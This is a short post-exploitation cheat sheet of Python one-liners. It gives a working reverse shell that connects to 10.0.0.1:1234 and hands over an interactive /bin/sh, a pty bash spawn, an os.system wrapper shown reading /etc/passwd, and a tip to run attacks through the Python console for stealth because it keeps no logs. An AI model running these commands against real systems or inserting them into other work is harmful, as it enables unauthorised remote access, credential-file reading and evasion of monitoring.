# Python Command and Scripts for Post Exploitation

One liners
-----------

**Start a web server that serves the local files on port 8000, single threaded**
```python
python -m SimpleHTTPServer 8000```

**Python reverse shell from [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)**
```python 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

**Spawn bash shell prompt**
```python
python -c 'import pty; pty.spawn("/bin/bash")'```

***Print all ASCII characters***
```python
python -c 'import string; print string.printable'```

**Run OS commands through Python Interpreter**
```python
python -c 'import os; os.system("command here")'```

example:

```
python -c 'import os; os.system("cat /etc/passwd")'```

Remember that the python console does not log code by default, so you can run all post-exploit shenanigans through the python console for added stealth. 
Also gets by certain environmental restrictions.
